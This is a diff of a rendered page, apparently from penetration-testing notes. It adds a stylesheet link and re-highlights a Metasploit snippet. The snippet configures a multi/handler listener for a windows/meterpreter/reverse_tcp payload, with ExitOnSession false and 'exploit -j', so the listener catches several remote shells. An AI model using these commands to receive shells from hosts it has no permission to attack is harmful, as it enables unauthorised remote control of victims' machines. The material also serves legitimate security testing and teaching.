@@ -42,6 +42,8 @@
       
     
     
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -968,13 +970,14 @@
 </table>
 <h2 id="multihandler-listener">Multihandler Listener</h2>
 <p>To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  </p>
-<pre><code class="language-bash">msf&gt;use exploit/multi/handler  
-msf&gt;set payload windows/meterpreter/reverse_tcp  
-msf&gt;set lhost &lt;IP&gt;  
-msf&gt;set lport &lt;PORT&gt;  
-msf&gt; set ExitOnSession false  
-msf&gt;exploit -j  
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>msf&gt;use<span style="color: #f8f8f2"> </span>exploit/multi/handler<span style="color: #f8f8f2">  </span>
+msf&gt;set<span style="color: #f8f8f2"> </span>payload<span style="color: #f8f8f2"> </span>windows/meterpreter/reverse_tcp<span style="color: #f8f8f2">  </span>
+msf&gt;set<span style="color: #f8f8f2"> </span>lhost<span style="color: #f8f8f2"> </span>&lt;IP&gt;<span style="color: #f8f8f2">  </span>
+msf&gt;set<span style="color: #f8f8f2"> </span>lport<span style="color: #f8f8f2"> </span>&lt;PORT&gt;<span style="color: #f8f8f2">  </span>
+msf&gt;<span style="color: #f8f8f2"> set </span>ExitOnSession<span style="color: #f8f8f2"> false  </span>
+msf&gt;exploit<span style="color: #f8f8f2"> </span>-j<span style="color: #f8f8f2">  </span>
+</code></pre></div>
+
 <p>The -j option is to keep all the connected session in the background.  </p>
 <h2 id="references">References</h2>
 <p><a href="https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675"></a>
